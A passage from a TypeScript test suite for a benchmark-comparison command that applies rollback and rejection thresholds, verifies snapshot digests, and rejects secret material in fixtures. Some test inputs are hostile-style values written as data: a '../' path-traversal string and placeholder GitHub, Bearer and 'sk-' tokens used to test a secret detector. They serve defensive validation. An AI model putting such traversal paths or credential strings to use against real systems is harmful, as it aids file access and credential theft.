      { name: 'prompt/schema token increase at 20%', metric: 'tokenIncrease', value: 20, roundedGroup: 'tokens' },
      { name: 'prompt/schema token increase above 20%', metric: 'tokenIncrease', value: 20.0001, expectedCode: 'prompt-schema-token-regression', expectedStatus: 'rollback', roundedGroup: 'tokens' },
      { name: 'cost increase below 20%', metric: 'costIncrease', value: 19.9999, roundedGroup: 'cost' },
      { name: 'cost increase at 20%', metric: 'costIncrease', value: 20, roundedGroup: 'cost' },
      { name: 'cost increase above 20%', metric: 'costIncrease', value: 20.0001, expectedCode: 'cost-regression-without-success-gain', expectedStatus: 'rollback', roundedGroup: 'cost' },
      { name: 'cost success gain below 3 points', metric: 'costSuccessGain', value: 2, expectedCode: 'cost-regression-without-success-gain', expectedStatus: 'rollback' },
      { name: 'cost success gain at 3 points', metric: 'costSuccessGain', value: 3 },
      { name: 'cost success gain above 3 points', metric: 'costSuccessGain', value: 4 },
    ]
    const roundedDecisions: Record<string, Array<{ value: number; triggered: boolean }>> = {}

    for (const testCase of cases) {
      const fixture = JSON.parse(benchmarkFixture()) as MutableFixture
      const runCount = testCase.metric === 'tokenIncrease'
        ? 10_000
        : testCase.metric === 'costIncrease'
          ? 5
          : 100
      const runs = (): Array<Record<string, unknown>> => Array.from(
        { length: runCount },
        (_, index) => benchmarkRun({ taskId: 'threshold', attempt: index + 1 }),
      )
      fixture.requiredCriticalTaskIds = ['threshold']
      fixture.baseline.runs = runs()
      fixture.candidate.runs = runs()

      switch (testCase.metric) {
        case 'security':
          for (const run of fixture.candidate.runs) run.securityCorrectness = testCase.value
          break
        case 'dataLoss':
          fixture.candidate.runs[0]!.dataLossEvents = testCase.value
          break
        case 'rollback':
          fixture.candidate.runs[0]!.rollbackSupported = testCase.value
          break
        case 'startup':
          for (const run of fixture.candidate.runs.slice(0, testCase.value as number)) run.startupSucceeded = false
          break
        case 'criticalDrop':
          for (const run of fixture.candidate.runs.slice(0, testCase.value as number)) {
            run.success = false
            run.failure = 'failure'
          }
          break
        case 'firstTokenIncrease':
          for (const run of fixture.candidate.runs) run.firstTokenMs = 100 * (1 + (testCase.value as number) / 100)
          break
        case 'tokenIncrease': {
          for (const run of fixture.candidate.runs) {
            run.promptTokens = 60
            run.schemaTokens = 60
          }
          fixture.candidate.runs[0]!.schemaTokens = 60
            + Math.round(((testCase.value as number) - 20) * runCount)
          break
        }
        case 'costIncrease':
          for (const run of fixture.candidate.runs) run.costUsd = 1 + (testCase.value as number) / 100
          break
        case 'costSuccessGain':
          for (const [index, run] of fixture.baseline.runs.entries()) {
            run.success = index < 50
            run.failure = run.success ? null : 'failure'
          }
          for (const [index, run] of fixture.candidate.runs.entries()) {
            run.success = index < 50 + (testCase.value as number)
            run.failure = run.success ? null : 'failure'
            run.costUsd = 1.200001
          }
          break
      }

      const path = tempFile('benchmark.json', JSON.stringify(fixture))
      try {
        const result = runCompareBenchmark(['--fixture', path, '--json'])
        const payload = JSON.parse(result.stdout) as BenchmarkComparison & {
          readonly issues?: readonly { readonly message: string }[]
        }
        if (testCase.expectedIssue !== undefined) {
          expect(payload.issues?.[0]?.message, testCase.name).toBe(testCase.expectedIssue)
          continue
        }

        const codes = [
          ...payload.nonCompensableFailures.map(failure => failure.code),
          ...payload.rollback.reasons.map(reason => reason.code),
        ]
        expect(codes, testCase.name).toEqual(testCase.expectedCode === undefined ? [] : [testCase.expectedCode])
        expect(payload.status, testCase.name).toBe(testCase.expectedStatus ?? 'accepted')

        if (testCase.roundedGroup !== undefined) {
          const value = testCase.roundedGroup === 'security'
            ? payload.candidate.securityCorrectness
            : testCase.roundedGroup === 'firstToken'
              ? payload.candidate.statistics.firstTokenMs.p95
              : testCase.roundedGroup === 'tokens'
                ? payload.candidate.statistics.promptSchemaTokens.mean
                : payload.candidate.statistics.costUsd.mean
          ;(roundedDecisions[testCase.roundedGroup] ??= []).push({
            value,
            triggered: testCase.expectedCode !== undefined,
          })
        }
      } finally {
        cleanup(path)
      }
    }

    expect(roundedDecisions).toEqual({
      security: [{ value: 95, triggered: true }, { value: 95, triggered: false }, { value: 95, triggered: false }],
      firstToken: [{ value: 115, triggered: false }, { value: 115, triggered: false }, { value: 115, triggered: true }],
      tokens: [{ value: 120, triggered: false }, { value: 120, triggered: false }, { value: 120, triggered: true }],
      cost: [{ value: 1.2, triggered: false }, { value: 1.2, triggered: false }, { value: 1.2, triggered: true }],
    })
  })

  it('uses finite cost means when large finite inputs trigger rollback', () => {
    const fixture = JSON.parse(benchmarkFixture()) as {
      baseline: { runs: Array<Record<string, unknown>> }
      candidate: { runs: Array<Record<string, unknown>> }
    }
    for (const run of fixture.baseline.runs) run.costUsd = 1e308
    for (const run of fixture.candidate.runs) run.costUsd = 1.3e308
    const path = tempFile('benchmark.json', JSON.stringify(fixture))
    try {
      const result = runCompareBenchmark(['--fixture', path, '--json'])
      const payload = JSON.parse(result.stdout) as BenchmarkComparison

      expect(result.status).toBe(1)
      expect(payload.status).toBe('rollback')
      expect(payload.rollback.reasons).toContainEqual(expect.objectContaining({
        code: 'cost-regression-without-success-gain',
      }))
      expect(payload.baseline.statistics.costUsd.mean).toBe(1e308)
      expect(payload.candidate.statistics.costUsd.mean).toBe(1.3e308)
      expect(result.stdout).not.toContain('"mean":null')
    } finally {
      cleanup(path)
    }
  })

  it('rejects a rollback snapshot whose digest does not match its embedded value', () => {
    const fixture = JSON.parse(benchmarkFixture()) as Record<string, unknown>
    fixture.evidenceKind = 'observed'
    fixture.previousSnapshots = {
      lock: {
        sha256: '0'.repeat(64),
        snapshot: { schemaVersion: 2, kind: 'curated-lock-snapshot', profile: 'web-curated', candidates: [] },
      },
      profile: {
        sha256: '1'.repeat(64),
        snapshot: { schemaVersion: 2, kind: 'curated-profile-snapshot', profile: 'web-curated', bundles: [] },
      },
    }
    const path = tempFile('benchmark.json', JSON.stringify(fixture))
    try {
      const result = runCompareBenchmark(['--fixture', path, '--json'])

      expect(result.status).toBe(1)
      expect(JSON.parse(result.stdout)).toMatchObject({
        issues: [{ message: 'previousSnapshots.lock.sha256 does not match its embedded snapshot' }],
      })
    } finally {
      cleanup(path)
    }
  })

  it.each([
    {
      name: 'lock snapshot profile',
      message: 'baseline.lockSnapshot snapshot.profile must match baseline.profile',
      mutate: (fixture: MutableBenchmarkFixture) => {
        fixture.previousSnapshots.lock = snapshotEnvelope({
          ...previousLockSnapshot,
          profile: 'other-profile',
        })
      },
    },
    {
      name: 'profile snapshot profile',
      message: 'baseline.profileSnapshot snapshot.profile must match baseline.profile',
      mutate: (fixture: MutableBenchmarkFixture) => {
        fixture.previousSnapshots.profile = snapshotEnvelope({
          ...previousProfileSnapshot,
          profile: 'other-profile',
        })
      },
    },
    {
      name: 'lock snapshot traversal',
      message: 'baseline.lockSnapshot.path must be a safe relative JSON path',
      mutate: (fixture: MutableBenchmarkFixture) => {
        ;fixture.baseline.lockSnapshot.path = '../locks/web.json'
      },
    },
    {
      name: 'profile snapshot extension',
      message: 'baseline.profileSnapshot.path must be a safe relative JSON path',
      mutate: (fixture: MutableBenchmarkFixture) => {
        ;fixture.baseline.profileSnapshot.path = 'profiles/web.txt'
      },
    },
  ])('rejects a mismatched rollback $name', ({ message, mutate }) => {
    const fixture = JSON.parse(benchmarkFixture()) as MutableBenchmarkFixture
    mutate(fixture)
    const path = tempFile('benchmark.json', JSON.stringify(fixture))
    try {
      const result = runCompareBenchmark(['--fixture', path, '--json'])

      expect(result.status).toBe(1)
      expect(JSON.parse(result.stdout)).toMatchObject({
        issues: [{ message }],
      })
    } finally {
      cleanup(path)
    }
  })

  it('rejects rollback snapshots that differ from the baseline referenced artifacts', () => {
    const path = tempFile('benchmark.json', benchmarkFixture())
    writeFileSync(join(dirname(path), 'locks/web.json'), JSON.stringify({
      ...previousLockSnapshot,
      candidates: [],
    }))
    try {
      const result = runCompareBenchmark(['--fixture', path, '--json'])

      expect(result.status).toBe(1)
      expect(JSON.parse(result.stdout)).toMatchObject({
        issues: [{
          message: 'baseline.lockSnapshot.sha256 does not match the referenced snapshot',
        }],
      })
    } finally {
      cleanup(path)
    }
  })

  it.each([
    {
      reference: 'profiles/web.json',
      snapshot: { ...previousProfileSnapshot, bundles: ['@deepseek-ai/dsh-base'] },
      message: 'baseline.profileSnapshot.sha256 does not match the referenced snapshot',
    },
    {
      reference: 'locks/web-curated.json',
      snapshot: {
        schemaVersion: 2,
        kind: 'curated-lock-snapshot',
        profile: 'web-curated',
        candidates: [],
        catalogRef: 'mutable',
      },
      message: 'candidate.lockSnapshot.sha256 does not match the referenced snapshot',
    },
    {
      reference: 'locks/web-curated.json',
      snapshot: {
        schemaVersion: 2,
        kind: 'curated-profile-snapshot',
        profile: 'web-curated',
        candidates: [],
      },
      message: 'candidate.lockSnapshot.sha256 does not match the referenced snapshot',
    },
    {
      reference: 'profiles/web-curated.json',
      snapshot: {
        schemaVersion: 2,
        kind: 'curated-profile-snapshot',
        profile: 'other-profile',
        bundles: [],
      },
      message: 'candidate.profileSnapshot.sha256 does not match the referenced snapshot',
    },
  ])('rejects a mismatched referenced snapshot: $message', ({ reference, snapshot, message }) => {
    const path = tempFile('benchmark.json', benchmarkFixture())
    writeFileSync(join(dirname(path), reference), JSON.stringify(snapshot))
    try {
      expect(JSON.parse(runCompareBenchmark(['--fixture', path, '--json']).stdout)).toMatchObject({
        issues: [{ message }],
      })
    } finally {
      cleanup(path)
    }
  })

  it.each([
    {
      field: 'lock' as const,
      snapshot: previousLockSnapshot,
      message: 'previousSnapshots.lock.snapshot.schemaVersion must be 2',
    },
    {
      field: 'profile' as const,
      snapshot: previousProfileSnapshot,
      message: 'previousSnapshots.profile.snapshot.schemaVersion must be 2',
    },
  ])('requires schema version 2 for the embedded $field rollback snapshot', ({ field, snapshot, message }) => {
    for (const schemaVersion of [undefined, 1, 3]) {
      const fixture = JSON.parse(benchmarkFixture()) as MutableBenchmarkFixture
      const incompatible = { ...snapshot } as Record<string, unknown>
      if (schemaVersion === undefined) delete incompatible.schemaVersion
      else incompatible.schemaVersion = schemaVersion
      fixture.previousSnapshots[field] = snapshotEnvelope(incompatible)
      const path = tempFile('benchmark.json', JSON.stringify(fixture))
      try {
        expect(JSON.parse(runCompareBenchmark(['--fixture', path, '--json']).stdout)).toMatchObject({
          issues: [{ message }],
        })
      } finally {
        cleanup(path)
      }
    }
  })

  it.each([
    {
      reference: 'locks/web.json',
      message: 'baseline.lockSnapshot.sha256 does not match the referenced snapshot',
    },
    {
      reference: 'profiles/web.json',
      message: 'baseline.profileSnapshot.sha256 does not match the referenced snapshot',
    },
    {
      reference: 'locks/web-curated.json',
      message: 'candidate.lockSnapshot.sha256 does not match the referenced snapshot',
    },
    {
      reference: 'profiles/web-curated.json',
      message: 'candidate.profileSnapshot.sha256 does not match the referenced snapshot',
    },
  ])('requires schema version 2 for referenced $reference', ({ reference, message }) => {
    for (const schemaVersion of [undefined, 1, 3]) {
      const path = tempFile('benchmark.json', benchmarkFixture())
      const snapshotPath = join(dirname(path), reference)
      const snapshot = JSON.parse(readFileSync(snapshotPath, 'utf8')) as Record<string, unknown>
      if (schemaVersion === undefined) delete snapshot.schemaVersion
      else snapshot.schemaVersion = schemaVersion
      writeFileSync(snapshotPath, JSON.stringify(snapshot))
      try {
        expect(JSON.parse(runCompareBenchmark(['--fixture', path, '--json']).stdout)).toMatchObject({
          issues: [{ message }],
        })
      } finally {
        cleanup(path)
      }
    }
  })

  it('never accepts planning history as a rollback snapshot', () => {
    const fixture = JSON.parse(benchmarkFixture()) as MutableBenchmarkFixture & {
      baseline: { lockSnapshot: string }
    }
    fixture.baseline.lockSnapshot.path = 'history/2026-08-24.json'
    const path = tempFile('benchmark.json', JSON.stringify(fixture))
    const historyPath = join(dirname(path), fixture.baseline.lockSnapshot.path)
    mkdirSync(dirname(historyPath), { recursive: true })
    writeFileSync(historyPath, JSON.stringify({
      schemaVersion: 1,
      kind: 'curated-planning-history',
      evidenceKind: 'planned',
      restorable: false,
    }))
    try {
      expect(JSON.parse(runCompareBenchmark(['--fixture', path, '--json']).stdout)).toMatchObject({
        issues: [{ message: 'baseline.lockSnapshot.sha256 does not match the referenced snapshot' }],
      })
    } finally {
      cleanup(path)
    }
  })

  it.each([
    { name: 'missing bundles', bundles: undefined, message: 'bundles must be an array' },
    { name: 'non-array bundles', bundles: {}, message: 'bundles must be an array' },
    { name: 'an empty bundle array', bundles: [], message: 'bundles must contain at least one bundle' },
    { name: 'an empty bundle name', bundles: [''], message: 'bundles[0] must be a non-empty string' },
  ])('rejects $name in embedded and referenced profile snapshots', ({ bundles, message }) => {
    const fixture = JSON.parse(benchmarkFixture()) as MutableBenchmarkFixture
    const embedded = { ...previousProfileSnapshot } as Record<string, unknown>
    if (bundles === undefined) delete embedded.bundles
    else embedded.bundles = bundles
    fixture.previousSnapshots.profile = snapshotEnvelope(embedded)
    let path = tempFile('benchmark.json', JSON.stringify(fixture))
    try {
      expect(JSON.parse(runCompareBenchmark(['--fixture', path, '--json']).stdout)).toMatchObject({
        issues: [{ message: `previousSnapshots.profile.snapshot.${message}` }],
      })
    } finally {
      cleanup(path)
    }

    path = tempFile('benchmark.json', benchmarkFixture())
    const referencedPath = join(dirname(path), 'profiles/web-curated.json')
    const referenced = JSON.parse(readFileSync(referencedPath, 'utf8')) as Record<string, unknown>
    if (bundles === undefined) delete referenced.bundles
    else referenced.bundles = bundles
    writeFileSync(referencedPath, JSON.stringify(referenced))
    try {
      expect(JSON.parse(runCompareBenchmark(['--fixture', path, '--json']).stdout)).toMatchObject({
        issues: [{ message: 'candidate.profileSnapshot.sha256 does not match the referenced snapshot' }],
      })
    } finally {
      cleanup(path)
    }
  })

  it('accepts an exact npm rollback install source', () => {
    const fixture = JSON.parse(benchmarkFixture()) as MutableBenchmarkFixture
    fixture.previousSnapshots.lock = snapshotEnvelope({
      ...previousLockSnapshot,
      candidates: [{
        ...previousLockSnapshot.candidates[0],
        installSource: {
          kind: 'npm',
          npmVersion: '1.2.3-alpha.1+build.01',
          npmIntegrity: 'sha512-wmFfSlWDE3ujFuBSY1W8s2gERSotHD4ueelg5BJ5Hd2/ssB5x24xEaQdbMzNhoAaUjpXeIwfOUdn+nLqHjiYGQ==',
        },
      }],
    })
    const path = tempFile('benchmark.json', JSON.stringify(fixture))
    try {
      const result = runCompareBenchmark(['--fixture', path, '--json'])
      expect(result.status, result.stdout).toBe(0)
    } finally {
      cleanup(path)
    }
  })

  it('computes statistics, failure distribution, weighted score, and snapshot references', () => {
    const path = tempFile('benchmark.json', benchmarkFixture())
    try {
      const result = runCompareBenchmark(['--fixture', path, '--json'])
      const payload = JSON.parse(result.stdout) as BenchmarkComparison

      expect(result.status).toBe(0)
      expect(payload.ok).toBe(true)
      expect(payload.status).toBe('accepted')
      expect(payload.previousSnapshots).toEqual({
        lock: snapshotEnvelope(previousLockSnapshot),
        profile: snapshotEnvelope(previousProfileSnapshot),
      })
      expect(payload.candidate.statistics.firstTokenMs).toEqual({ mean: 20, p50: 20, p95: 30 })
      expect(payload.candidate.statistics.promptSchemaTokens).toEqual({ mean: 100, p50: 100, p95: 120 })
      expect(payload.candidate.failureDistribution).toEqual({ timeout: 5 })
      expect(payload.candidate.weightedScore).toBe(78.9)
    } finally {
      cleanup(path)
    }
  })

  it('counts and sorts prototype-like benchmark failure reasons', () => {
    const reasons = ['__proto__', 'constructor', 'toString']
    const path = tempFile('benchmark-prototype-reasons.json', benchmarkFixture(
      reasons.map((failure, index) => ({
        taskId: `prototype-reason-${String(index)}`,
        success: false,
        failure,
      })),
    ))
    try {
      const result = runCompareBenchmark(['--fixture', path, '--json'])
      const payload = JSON.parse(result.stdout) as BenchmarkComparison

      expect(Object.keys(payload.candidate.failureDistribution))
        .toEqual([...reasons, 'timeout'].sort((left, right) => left.localeCompare(right)))
      for (const reason of reasons) expect(payload.candidate.failureDistribution[reason]).toBe(5)
    } finally {
      cleanup(path)
    }
  })

  it('rejects fine-grained GitHub tokens without echoing them', () => {
    const secret = 'github_pat_0123456789abcdefghijklmnopqrstuvwxyz'
    const path = tempFile('benchmark-fine-grained-token.json', benchmarkFixture([benchmarkRun({
      taskId: 'fine-grained-token',
      success: false,
      failure: secret,
    })]))
    try {
      const result = runCompareBenchmark(['--fixture', path, '--json'])

      expect(result.status).toBe(1)
      expect(JSON.parse(result.stdout)).toMatchObject({
        issues: [{ message: 'benchmark fixture must not contain secret material' }],
      })
      expect(result.stdout).not.toContain(secret)
    } finally {
      cleanup(path)
    }
  })

  it('rejects secret-like benchmark failure reasons without echoing them', () => {
    const path = tempFile('benchmark-secret.json', benchmarkFixture([benchmarkRun({
      taskId: 'secret-bearing-failure',
      success: false,
      failure: 'provider returned Bearer hidden-benchmark-token',
    })]))
    try {
      const result = runCompareBenchmark(['--fixture', path, '--json'])
      const payload = JSON.parse(result.stdout) as {
        readonly command: 'compare-benchmark'
        readonly ok: boolean
        readonly issues: readonly { readonly message: string }[]
      }

      expect(result.status).toBe(1)
      expect(payload).toMatchObject({
        command: 'compare-benchmark',
        ok: false,
        issues: [{ message: 'benchmark fixture must not contain secret material' }],
      })
      expect(result.stdout).not.toContain('hidden-benchmark-token')
    } finally {
      cleanup(path)
    }
  })

  it('recursively rejects secret material in benchmark execution metadata', () => {
    const fixture = JSON.parse(benchmarkFixture()) as MutableBenchmarkFixture
    const secret = 'Bearer hidden-benchmark-metadata'
    fixture.baseline.execution.environment.prompt = secret
    const path = tempFile('benchmark-metadata-secret.json', JSON.stringify(fixture))
    try {
      const result = runCompareBenchmark(['--fixture', path, '--json'])

      expect(result.status).toBe(1)
      expect(JSON.parse(result.stdout)).toMatchObject({
        issues: [{ message: 'benchmark fixture must not contain secret material' }],
      })
      expect(result.stdout).not.toContain(secret)
    } finally {
      cleanup(path)
    }
  })

  it.each([
    ['execution id', (fixture: MutableBenchmarkFixture, secret: string) => {
      fixture.baseline.execution.id = secret
      fixture.candidate.execution.id = secret
    }],
    ['model', (fixture: MutableBenchmarkFixture, secret: string) => {
      fixture.baseline.execution.environment.model = secret
      fixture.candidate.execution.environment.model = secret
    }],
    ['prompt', (fixture: MutableBenchmarkFixture, secret: string) => {
      fixture.baseline.execution.environment.prompt = secret
      fixture.candidate.execution.environment.prompt = secret
    }],
    ['workspace', (fixture: MutableBenchmarkFixture, secret: string) => {
      fixture.baseline.execution.environment.workspace = secret
      fixture.candidate.execution.environment.workspace = secret
    }],
    ['network', (fixture: MutableBenchmarkFixture, secret: string) => {
      fixture.baseline.execution.environment.network = secret
      fixture.candidate.execution.environment.network = secret
    }],
    ['string seed', (fixture: MutableBenchmarkFixture, secret: string) => {
      fixture.baseline.execution.environment.seed = secret
      fixture.candidate.execution.environment.seed = secret
    }],
    ['unconsumed metadata', (fixture: MutableBenchmarkFixture, secret: string) => {
      Object.assign(fixture, { metadata: { note: secret } })
    }],
  ] as const)('rejects secret material in complete benchmark input %s without echoing it', (_name, injectSecret) => {
    const fixture = JSON.parse(benchmarkFixture()) as MutableBenchmarkFixture
    const secret = 'sk-complete-benchmark-input-secret'
    injectSecret(fixture, secret)
    const path = tempFile('benchmark-complete-input-secret.json', JSON.stringify(fixture))
    try {
      const result = runCompareBenchmark(['--fixture', path, '--json'])

      expect(result.status).toBe(1)
      expect(JSON.parse(result.stdout)).toMatchObject({
        issues: [{ message: 'benchmark fixture must not contain secret material' }],
      })
      expect(result.stdout).not.toContain(secret)
      expect(result.stderr).not.toContain(secret)
    } finally {
      cleanup(path)
    }
  })

  it('accepts environment variable references in benchmark metadata', () => {
    const fixture = JSON.parse(benchmarkFixture()) as MutableBenchmarkFixture
    Object.assign(fixture, {
      metadata: {
        apiKeyEnv: 'DEEPSEEK_API_KEY',
        tokenEnv: 'CURATED_ACCESS_TOKEN',
      },
    })
    const path = tempFile('benchmark-env-references.json', JSON.stringify(fixture))
    try {
      const result = runCompareBenchmark(['--fixture', path, '--json'])

      expect(result.status, result.stdout).toBe(0)
    } finally {
      cleanup(path)
    }
  })

  it('rejects every non-compensable threshold even when the weighted score is high', () => {
    const path = tempFile('benchmark.json', benchmarkFixture([benchmarkRun({
      taskId: 'd',
      critical: true,
      startupSucceeded: false,
      dataLossEvents: 1,
      rollbackSupported: false,
      success: false,
      failure: 'startup',
      quality: 100,
      securityCorrectness: 90,
      reliability: 100,
      performanceCost: 100,
      operationExperience: 100,
      upgradeCompatibility: 100,
    })]))
    try {
      const result = runCompareBenchmark(['--fixture', path, '--json'])
      const payload = JSON.parse(result.stdout) as BenchmarkComparison

      expect(result.status).toBe(1)
      expect(payload.status).toBe('rejected')
      expect(payload.nonCompensableFailures.map(failure => failure.code)).toEqual([
        'critical-success-rate-drop',
        'data-loss-detected',
        'rollback-impossible',
        'security-correctness-below-95',
        'startup-failure-rate-above-1',
      ])
    } finally {
      cleanup(path)
    }
  })

  it('marks rollback for first-token, token, and cost regressions with prior snapshots', () => {
    const fixture = JSON.parse(benchmarkFixture()) as {
      baseline: { runs: Array<Record<string, unknown>> }
      candidate: { runs: Array<Record<string, unknown>> }
    }
    fixture.baseline.runs = fixture.baseline.runs.map(run => ({
      ...run,
      firstTokenMs: 100,
      promptTokens: 50,
      schemaTokens: 50,
      costUsd: 1,
    }))
    fixture.candidate.runs = fixture.candidate.runs.map(run => ({
      ...run,
      firstTokenMs: 116,
      promptTokens: 61,
      schemaTokens: 60,
      costUsd: 1.21,
    }))
    const path = tempFile('benchmark.json', JSON.stringify(fixture))
    try {
      const result = runCompareBenchmark(['--fixture', path, '--json'])
      const payload = JSON.parse(result.stdout) as BenchmarkComparison

      expect(result.status).toBe(1)
      expect(payload.status).toBe('rollback')
      expect(payload.rollback).toEqual({
        required: true,
        previousSnapshots: {
          lock: snapshotEnvelope(previousLockSnapshot),
          profile: snapshotEnvelope(previousProfileSnapshot),
        },
        reasons: [
          { code: 'first-token-p95-regression', message: 'first-token P95 increased by more than 15%' },
          { code: 'prompt-schema-token-regression', message: 'prompt and schema tokens increased by more than 20%' },
          { code: 'cost-regression-without-success-gain', message: 'cost increased by more than 20% while success gain stayed below 3 percentage points' },
        ],
      })
    } finally {
      cleanup(path)
    }
  })

  it('runs through the compare-benchmark source-tree wrapper', () => {
    const dir = mkdtempSync(join(tmpdir(), 'dsh-curated-bench-'))
    const path = join(dir, 'benchmark.json')
    const content = stageBenchmarkSnapshotReferences(dir, benchmarkFixture())
    writeFileSync(path, content)
    try {
      const result = runNode('compare-benchmark.mjs', ['--fixture', path, '--json'])

      expect(result.status).toBe(0)
      expect(JSON.parse(result.stdout)).toMatchObject({
        command: 'compare-benchmark',
        ok: true,
        status: 'accepted',
      })
    } finally {
      rmSync(dir, { recursive: true, force: true })
    }
  })

  it('renders accepted, rejected, and rollback comparisons in text mode', () => {
    const accepted = tempFile('accepted.json', benchmarkFixture())
    const rejected = tempFile('rejected.json', benchmarkFixture([benchmarkRun({
      critical: true,
      startupSucceeded: false,
      dataLossEvents: 1,
      rollbackSupported: false,
      success: false,
      failure: 'startup',
      securityCorrectness: 90,
    })]))
    const rollbackFixture = JSON.parse(benchmarkFixture()) as {
      requiredCriticalTaskIds: string[]
      baseline: { runs: Array<Record<string, unknown>> }
      candidate: { runs: Array<Record<string, unknown>> }
    }
    rollbackFixture.requiredCriticalTaskIds = ['task']
    rollbackFixture.baseline.runs = repeatedBenchmarkRuns({
      taskId: 'task',
      critical: true,
      success: true,
      firstTokenMs: 0,
      promptTokens: 0,
      schemaTokens: 0,
      costUsd: 0,
    })
    rollbackFixture.candidate.runs = repeatedBenchmarkRuns({
      taskId: 'task',
      critical: true,
      success: true,
      firstTokenMs: 1,
      promptTokens: 0,
      schemaTokens: 0,
      costUsd: 0,
    })
    const rollback = tempFile('rollback.json', JSON.stringify(rollbackFixture))
    try {
      expect(runCompareBenchmark(['--fixture', accepted]).stdout)
        .toBe('compare-benchmark: accepted (web-curated, score 78.9)\n')
      expect(runCompareBenchmark(['--fixture', rejected]).stdout)
        .toContain('compare-benchmark: rejected (web-curated, 5 issues)')
      expect(runCompareBenchmark(['--fixture', rollback]).stdout)
        .toContain('compare-benchmark: rollback (web-curated, 1 issues)')
    } finally {
      cleanup(accepted)
      cleanup(rejected)
      cleanup(rollback)
    }
  })

  it('reports malformed benchmark fixtures through command input errors', () => {
    const invalidTopLevel = tempFile('invalid-top-level.json', '[]')
    const emptyRunsFixture = JSON.parse(benchmarkFixture()) as { baseline: { runs: unknown[] } }
    emptyRunsFixture.baseline.runs = []
    const emptyRuns = tempFile('empty-runs.json', JSON.stringify(emptyRunsFixture))
    const badSnapshotFixture = JSON.parse(benchmarkFixture()) as { previousSnapshots: { lock: unknown } }
    badSnapshotFixture.previousSnapshots.lock = ''
    const badSnapshot = tempFile('bad-snapshot.json', JSON.stringify(badSnapshotFixture))
    const missingProfileFixture = JSON.parse(benchmarkFixture()) as { baseline: unknown }
    missingProfileFixture.baseline = null
    const missingProfile = tempFile('missing-profile.json', JSON.stringify(missingProfileFixture))
    try {
      expect(JSON.parse(runCompareBenchmark(['--fixture', invalidTopLevel, '--json']).stdout)).toMatchObject({
        issues: [{ message: 'benchmark fixture must be a JSON object' }],
      })
      expect(JSON.parse(runCompareBenchmark(['--fixture', emptyRuns, '--json']).stdout)).toMatchObject({
        issues: [{ message: 'baseline.runs must be a non-empty array' }],
      })
      expect(JSON.parse(runCompareBenchmark(['--fixture', badSnapshot, '--json']).stdout)).toMatchObject({
        issues: [{ message: 'previousSnapshots.lock must be an object' }],
      })
      expect(JSON.parse(runCompareBenchmark(['--fixture', missingProfile, '--json']).stdout)).toMatchObject({
        issues: [{ message: 'baseline must be an object' }],
      })
    } finally {
      cleanup(invalidTopLevel)
      cleanup(emptyRuns)
      cleanup(badSnapshot)
      cleanup(missingProfile)
    }
  })

  it('rejects malformed benchmark provenance and snapshot fields', () => {
    const cases: Array<{
      readonly message: string
      readonly mutate: (fixture: MutableBenchmarkFixture) => void
    }> = [
      {
        message: 'planned benchmark evidence must declare pendingCampaigns',
        mutate: (fixture) => {
          fixture.evidenceKind = 'planned'
          delete fixture.pendingCampaigns
        },
      },
      {
        message: 'previousSnapshots.lock.sha256 must be a lowercase SHA-256 digest',
        mutate: (fixture) => { fixture.previousSnapshots.lock.sha256 = 'invalid' },
      },
      {
        message: 'previousSnapshots.lock.snapshot.kind must be curated-lock-snapshot',
        mutate: (fixture) => {
          fixture.previousSnapshots.lock = snapshotEnvelope({
            ...previousLockSnapshot,
            kind: 'curated-profile-snapshot',
          })
        },
      },
      {
        message: 'previousSnapshots.lock.snapshot must not depend on a mutable catalogRef',
        mutate: (fixture) => {
          fixture.previousSnapshots.lock = snapshotEnvelope({
            ...previousLockSnapshot,
            catalogRef: 'mutable',
          })
        },
      },
      {
        message: 'previousSnapshots.lock.snapshot.candidates must be an array',
        mutate: (fixture) => {
          fixture.previousSnapshots.lock = snapshotEnvelope({
            ...previousLockSnapshot,
            candidates: {},
          })
        },
      },
      {
        message: 'previousSnapshots.lock.snapshot.candidates[0].installSource.commit must be a full non-placeholder lowercase Git SHA',
        mutate: (fixture) => {
          const candidate = previousLockSnapshot.candidates[0]
          fixture.previousSnapshots.lock = snapshotEnvelope({
            ...previousLockSnapshot,
            candidates: [{
              ...candidate,
              installSource: { ...candidate.installSource, commit: 'short' },
            }],
          })
        },
      },
      {
        message: 'previousSnapshots.lock.snapshot.candidates[0].sourceContentSha256 must be a non-placeholder lowercase SHA-256 digest',
        mutate: (fixture) => {
          fixture.previousSnapshots.lock = snapshotEnvelope({
            ...previousLockSnapshot,
            candidates: [{ ...previousLockSnapshot.candidates[0], sourceContentSha256: 'invalid' }],
          })
        },
      },
      {
        message: 'previousSnapshots.lock.snapshot.candidates[0].installSource must be an object',
        mutate: (fixture) => {
          const { installSource: _installSource, ...candidate } = previousLockSnapshot.candidates[0]
          fixture.previousSnapshots.lock = snapshotEnvelope({
            ...previousLockSnapshot,
            candidates: [candidate],
          })
        },
      },
      {
        message: 'previousSnapshots.lock.snapshot.candidates[0].installSource must contain exactly kind, npmVersion, and npmIntegrity',
        mutate: (fixture) => {
          fixture.previousSnapshots.lock = snapshotEnvelope({
            ...previousLockSnapshot,
            candidates: [{
              ...previousLockSnapshot.candidates[0],
              installSource: {
                kind: 'npm',
                npmVersion: '1.2.3',
                npmIntegrity: 'sha512-wmFfSlWDE3ujFuBSY1W8s2gERSotHD4ueelg5BJ5Hd2/ssB5x24xEaQdbMzNhoAaUjpXeIwfOUdn+nLqHjiYGQ==',
                commit: fixtureCommitB,
              },
            }],
          })
        },
      },
      {
        message: 'previousSnapshots.lock.snapshot.candidates[0].installSource.npmVersion must be an exact npm version',
        mutate: (fixture) => {
          fixture.previousSnapshots.lock = snapshotEnvelope({
            ...previousLockSnapshot,
            candidates: [{
              ...previousLockSnapshot.candidates[0],
              installSource: {
                kind: 'npm',
                npmVersion: '^1.2.3',
                npmIntegrity: 'sha512-wmFfSlWDE3ujFuBSY1W8s2gERSotHD4ueelg5BJ5Hd2/ssB5x24xEaQdbMzNhoAaUjpXeIwfOUdn+nLqHjiYGQ==',
              },
            }],
          })
        },
      },
      {
        message: 'previousSnapshots.lock.snapshot.candidates[0].installSource.npmVersion must be an exact npm version',
        mutate: (fixture) => {
          fixture.previousSnapshots.lock = snapshotEnvelope({
            ...previousLockSnapshot,
            candidates: [{
              ...previousLockSnapshot.candidates[0],
              installSource: {
                kind: 'npm',
                npmVersion: '1.2.3-01',
                npmIntegrity: 'sha512-wmFfSlWDE3ujFuBSY1W8s2gERSotHD4ueelg5BJ5Hd2/ssB5x24xEaQdbMzNhoAaUjpXeIwfOUdn+nLqHjiYGQ==',
              },
            }],
          })
        },
      },
      {
